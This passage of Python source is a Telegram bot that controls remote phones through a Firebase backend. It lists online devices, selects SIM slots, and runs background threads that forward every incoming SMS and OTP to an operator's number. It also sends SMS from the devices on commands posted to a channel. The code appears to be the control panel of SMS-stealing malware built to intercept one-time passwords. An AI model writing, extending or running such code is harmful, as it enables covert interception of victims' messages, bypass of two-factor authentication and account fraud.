        f"👇 Select SIM Slot:"
    )

    if hasattr(update_or_query, 'message'):
        await update_or_query.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await update_or_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

# ============================
# LIST
# ============================
async def list_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("❌ Run /setup first.")
        return
    online = get_online_devices(user_id)
    if not online:
        await update.message.reply_text("❌ No online devices.")
        return
    text = f"📋 Device List ({len(online)} online)\n\n"
    for i, (d, data) in enumerate(online.items(), 1):
        battery = normalize_battery(get_field(data["raw"], "battery"))
        text += f"{i}. {d}\n     📱 {data['modelName']} | 🔋 {battery}\n\n"
    text += "Tap to copy ID → /search ID"
    if len(text) > 4000:
        text = text[:4000] + "\n\n...truncated"
    await update.message.reply_text(text)

# ============================
# ✅ TEST SMS HELPER
# ============================
async def _send_test_sms(update: Update, user_id, forward_number):
    """Selected SIM se turant test SMS bhejta hai forward number pe."""
    selected = get_selected(user_id)
    if not selected or not selected.get("deviceId"):
        await update.message.reply_text(
            "⚠️ Test SMS nahi bheja — pehle /devices se SIM select karo."
        )
        return

    device_id = selected["deviceId"]
    sim_slot = selected.get("simSlotIndex", 0)
    from_number = selected.get("simPhoneNumber", "Unknown")
    sim_label = "SIM 1" if str(sim_slot) == "0" else ("SIM 2" if str(sim_slot) == "1" else f"Slot {sim_slot}")

    test_msg = "fwd test by anyxpapa"

    await update.message.reply_text(
        f"🧪 Test SMS bhej raha hoon...\n"
        f"📱 Device: {device_id}\n"
        f"📶 {sim_label}\n"
        f"📞 To: {forward_number}"
    )

    success = send_sms_command(
        user_id, device_id, forward_number, test_msg, from_number
    )

    if success:
        await update.message.reply_text(
            f"✅ Test SMS bhej diya!\n\n"
            f"📶 {sim_label} se gaya\n"
            f"📞 To: {forward_number}\n"
            f"💬 Message: <code>{test_msg}</code>\n\n"
            f"Ab aage aane wale OTP/SMS yahin forward honge.",
            parse_mode="HTML"
        )
        logger.info(f"🧪 Test SMS sent via {sim_label} → {forward_number}")
    else:
        await update.message.reply_text(
            f"❌ Test SMS fail ho gaya!\n\n"
            f"Check karo:\n"
            f"• Device online hai?\n"
            f"• Firebase URL sahi hai?\n"
            f"• SIM slot select kiya tha?\n\n"
            f"Try: /status"
        )
        logger.error(f"❌ Test SMS failed → {forward_number}")

# ============================
# ✅ SET OTP — Auto Test SMS
# ============================
async def setotp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("❌ Run /setup")
        return
    if context.args:
        number = context.args[0]
        if not re.match(r"^\+?[0-9]{10,15}$", number):
            await update.message.reply_text("❌ Invalid number.")
            return
        set_otp_number(user_id, number)
        await update.message.reply_text(f"✅ Forward number set: {number}")
        await _send_test_sms(update, user_id, number)
        return
    await update.message.reply_text(
        "📞 Send phone number (with country code):\n"
        "Example: +919876543210\n"
        "/cancel to abort"
    )
    return WAITING_OTP_NUMBER

async def otp_number_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    number = update.message.text.strip()
    if not re.match(r"^\+?[0-9]{10,15}$", number):
        await update.message.reply_text("❌ Invalid number. Try again.")
        return WAITING_OTP_NUMBER
    set_otp_number(user_id, number)
    await update.message.reply_text(f"✅ Forward number set: {number}")
    await _send_test_sms(update, user_id, number)
    return ConversationHandler.END

async def otp_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled.")
    return ConversationHandler.END

# ============================
# CHANNEL MESSAGE
# ============================
def get_user_by_channel(channel_id):
    for uid, cfg in user_configs.items():
        if cfg.get("channel_id") == channel_id:
            return uid
    return None

async def handle_channel_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.channel_post:
        return

    channel_id = update.channel_post.chat_id
    text = update.channel_post.text or update.channel_post.caption or ""

    if not text.strip():
        return

    logger.info(f"📢 Channel post | ID: {channel_id}")

    user_id = get_user_by_channel(channel_id)
    if not user_id:
        return

    selected = get_selected(user_id)
    if not selected or not selected.get("deviceId"):
        return

    device_id = selected["deviceId"]
    from_number = selected.get("simPhoneNumber", "Unknown")

    to_number = None
    msg = None

    fmt1_to = re.search(r"To\s*\(Tap\s*to\s*copy\)\s*[:\-]?\s*\n?\s*([+\d][\d\s\-]{8,15})", text, re.IGNORECASE)
    fmt1_body = re.search(r"Body\s*\(Tap\s*to\s*copy\)\s*[:\-]?\s*\n?\s*([\s\S]+?)(?:\n\s*\n|\n📋|\n📱|\Z)", text, re.IGNORECASE)
    if fmt1_to and fmt1_body:
        to_number = re.sub(r"[\s\-]", "", fmt1_to.group(1)).strip()
        msg = fmt1_body.group(1).strip()

    if not to_number or not msg:
        fmt2_to = re.search(r"(?:📞|📱|☎|To|to)\s*[:\-]\s*([+\d][\d\s\-]{8,15})", text, re.IGNORECASE)
        fmt2_msg = re.search(r"(?:💬|Message|Msg|SMS|Text|Body)\s*[:\-]\s*([^\n]+)", text, re.IGNORECASE)
        if fmt2_to and fmt2_msg:
            to_number = re.sub(r"[\s\-]", "", fmt2_to.group(1)).strip()
            msg = fmt2_msg.group(1).strip()

    if not to_number or not msg:
        fmt3 = re.search(r"One[\-\s]?tap\s*copy\s*[:\-]?\s*\n?\s*(\+?\d{10,15})\s*\|\s*([^\n]+)", text, re.IGNORECASE)
        if fmt3:
            to_number = re.sub(r"[\s\-]", "", fmt3.group(1)).strip()
            msg = fmt3.group(2).strip()

    if not to_number or not msg:
        g_to = re.search(r"(?:To|Number|Num)\s*[:\-]\s*(\+?\d[\d\s\-]{8,15})", text, re.IGNORECASE)
        g_msg = re.search(r"(?:Message|Msg|SMS|Text|Body)\s*[:\-]\s*([^\n]+)", text, re.IGNORECASE)
        if g_to and g_msg:
            to_number = re.sub(r"[\s\-]", "", g_to.group(1)).strip()
            msg = g_msg.group(1).strip()

    if not to_number or not msg:
        lines = [l.strip() for l in text.split("\n") if l.strip()]
        for i, line in enumerate(lines):
            num_match = re.match(r"^\+?(\d{10,15})$", line)
            if num_match and not to_number:
                to_number = num_match.group(1)
                if i + 1 < len(lines):
                    nl = lines[i + 1]
                    if not re.match(r"^(?:To|Body|Message|Msg)\s*\(", nl, re.IGNORECASE):
                        msg = nl
                        break

    if not to_number or not msg:
        return

    msg = msg.strip()
    msg = re.sub(r"\s*[`'\"*]+$", "", msg).strip()

    logger.info(f"⚡ Channel SMS: To={to_number} | From={from_number}")

    success = send_sms_command(user_id, device_id, to_number, msg, from_number)

    if success:
        otp = extract_otp_from_text(msg)
        if otp:
            send_otp_with_buttons(
                int(user_id),
                "✅ <b>Channel OTP Forwarded</b>",
                otp,
                msg,
                to_number=to_number
            )
        else:
            send_message_with_copy(
                int(user_id),
                f"✅ <b>Channel SMS Forwarded</b>\n\n"
                f"📞 To: <code>{to_number}</code>\n"
                f"📱 Device: <code>{device_id}</code>\n"
                f"📶 From: {from_number}",
                msg
            )

# ============================
# OTP POLLING
# ============================
def poll_otp_updates():
    while True:
        try:
            for user_id in list(user_configs.keys()):
                try:
                    otp_number = get_otp_number(user_id)
                    if not otp_number:
                        continue
                    selected = get_selected(user_id)
                    if not selected or not selected.get("deviceId"):
                        continue
                    current_otp = fetch_otp(user_id)
                    if not current_otp:
                        continue
                    if user_id not in last_otp or last_otp[user_id] != current_otp:
                        last_otp[user_id] = current_otp
                        cfg = user_configs.get(user_id)
                        if cfg:
                            cfg["last_otp_value"] = current_otp
                            save_user_configs()
                        device_id = selected["deviceId"]
                        from_number = selected.get("simPhoneNumber", "Unknown")

                        send_sms_command(user_id, device_id, otp_number, current_otp, from_number)

                        send_otp_with_buttons(
                            int(user_id),
                            "🔑 <b>OTP Received</b>",
                            current_otp,
                            f"OTP: {current_otp}",
                            to_number=otp_number
                        )
                        logger.info(f"✅ OTP forwarded: {otp_number} = {current_otp}")
                except Exception as e:
                    logger.error(f"OTP poll error: {e}")
        except Exception as e:
            logger.error(f"OTP loop error: {e}")
        time.sleep(0.1)

# ============================
# INCOMING MESSAGE FORWARD
# ============================
def poll_incoming_messages():
    while True:
        try:
            for user_id in list(user_configs.keys()):
                try:
                    forward_number = get_otp_number(user_id)
                    if not forward_number:
                        continue
                    selected = get_selected(user_id)
                    if not selected or not selected.get("deviceId"):
                        continue
                    device_id = selected["deviceId"]
                    from_number = selected.get("simPhoneNumber", "Unknown")

                    cfg = user_configs.get(str(user_id), {})
                    processed_keys = cfg.get("processed_keys", [])
                    processed_device = cfg.get("processed_device")

                    if processed_device != device_id:
                        initialize_processed_keys(str(user_id), device_id)
                        processed_keys = cfg.get("processed_keys", [])

                    processed_set = set(processed_keys)
                    device_msgs, _ = fetch_messages(user_id, device_id)
                    if not device_msgs or not isinstance(device_msgs, dict):
                        continue

                    new_keys = []
                    for msg_key, msg_data in device_msgs.items():
                        if msg_key in processed_set:
                            continue
                        if not is_incoming_message(msg_data):
                            processed_set.add(msg_key)
                            new_keys.append(msg_key)
                            continue
                        extracted = extract_message_data(msg_data)
                        if not extracted or not extracted["text"]:
                            processed_set.add(msg_key)
                            new_keys.append(msg_key)
                            continue
                        msg_text = extracted["text"]
                        sender = extracted.get("sender", "Unknown")
                        success = send_sms_command(user_id, device_id, forward_number, msg_text, from_number)
                        processed_set.add(msg_key)
                        new_keys.append(msg_key)
                        if success:
                            logger.info(f"📥 Full fwd ({len(msg_text)} chars)")
                            otp = extract_otp_from_text(msg_text)
                            if otp:
                                send_otp_with_buttons(
                                    int(user_id),
                                    "✅ <b>Message Forwarded</b>",
                                    otp,
                                    msg_text,
                                    sender=sender,
                                    to_number=forward_number
                                )
                            else:
                                send_message_with_copy(
                                    int(user_id),
                                    f"✅ <b>Message Forwarded</b>\n\n"
                                    f"📞 To: <code>{forward_number}</code>\n"
                                    f"👤 Sender: {sender}",
                                    msg_text
                                )

                    if new_keys:
                        processed_keys.extend(new_keys)
                        cfg["processed_keys"] = processed_keys
                        save_user_configs()
                except Exception as e:
                    logger.error(f"Incoming forward error: {e}")
        except Exception as e:
            logger.error(f"Incoming loop error: {e}")
        time.sleep(0.1)

# ============================
# MAIN
# ============================
def main():
    logger.info("=" * 50)
    logger.info(f"🤖 Starting {BOT_NAME}")
    logger.info("=" * 50)

    try:
        r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook", timeout=5)
        logger.info(f"✅ Webhook delete: {r.status_code}")
    except Exception as e:
        logger.warning(f"Webhook delete failed: {e}")

    try:
        r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe", timeout=5)
        data = r.json()
        if data.get("ok"):
            bot_info = data["result"]
            logger.info(f"✅ Bot: @{bot_info.get('username')}")
        else:
            logger.error(f"❌ getMe failed: {data}")
            return
    except Exception as e:
        logger.error(f"❌ getMe error: {e}")
        return

    app = Application.builder().token(BOT_TOKEN).build()

    threading.Thread(target=poll_otp_updates, daemon=True).start()
    threading.Thread(target=poll_incoming_messages, daemon=True).start()

    # Search conversation
    search_conv = ConversationHandler(
        entry_points=[CommandHandler("search", search_command)],
        states={
            WAITING_DEVICE_ID: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, search_device_input)
            ]
        },
        fallbacks=[CommandHandler("cancel", search_cancel)],
    )
    app.add_handler(search_conv)

    # Setup conversation
    setup_conv = ConversationHandler(
        entry_points=[CommandHandler("setup", setup_start)],
        states={
            URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_url)],
            CHANNEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_channel)]
        },
        fallbacks=[CommandHandler("cancel", setup_cancel)],
    )
    app.add_handler(setup_conv)

    # SetOTP conversation
    otp_conv = ConversationHandler(
        entry_points=[CommandHandler("setotp", setotp_command)],
        states={
            WAITING_OTP_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, otp_number_input)]
        },
        fallbacks=[CommandHandler("cancel", otp_cancel)],
    )
    app.add_handler(otp_conv)

    # Callback handlers
    app.add_handler(CallbackQueryHandler(device_callback, pattern="^dev_"))
    app.add_handler(CallbackQueryHandler(sim_callback, pattern="^sim_"))

    # Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("devices", devices_command))
    app.add_handler(CommandHandler("list", list_command))
    app.add_handler(CommandHandler("resetforward", reset_forward))
    app.add_handler(CommandHandler("scan", scan_command))
    app.add_handler(CommandHandler("status", status_command))

    # Channel posts
    app.add_handler(MessageHandler(filters.TEXT & filters.ChatType.CHANNEL, handle_channel_message))

    logger.info("🤖 Bot started polling...")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)

if __name__ == "__main__":
    main()